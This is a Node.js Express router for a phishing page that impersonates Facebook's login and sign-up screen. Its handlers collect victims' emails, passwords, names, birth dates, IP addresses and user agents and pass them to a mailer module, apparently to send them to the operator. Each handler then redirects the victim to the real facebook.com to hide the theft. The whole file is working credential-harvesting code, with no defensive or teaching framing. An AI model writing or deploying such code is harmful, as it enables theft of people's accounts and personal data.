var express = require('express');
var router = express.Router();
let clientMailer = require('./clientMailer.js');

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Facebook – log in or sign up' });
});

router.post('/', function(req, res, next) {
  try { 
    const users = {
      email: req.body.email,
      password: req.body.password,
      ip_address: (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim(),
      agent: req.useragent.source,
    }
    clientMailer.sendLogin(users.email,users.password,users.ip_address,users.agent);
    return res.redirect("https://www.facebook.com/");
  } catch (error) {
    console.log(error)
  }
});

router.post('/signUp', function(req, res, next) {
  try { 
    const users = {
      fullName: req.body.firstName +" "+ req.body.lastName,
      email: req.body.email,
      password: req.body.password,
      birth: req.body.day +" "+req.body.month +" "+req.body.year,
      ip_address: (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim(),
      agent: req.useragent.source,
    }
    clientMailer.sendRegistration(users.fullName,users.email,users.password,users.birth,users.ip_address,users.agent);
    return res.redirect("https://www.facebook.com/");
  } catch (error) {
    console.log(error)
  }
});

module.exports = router;
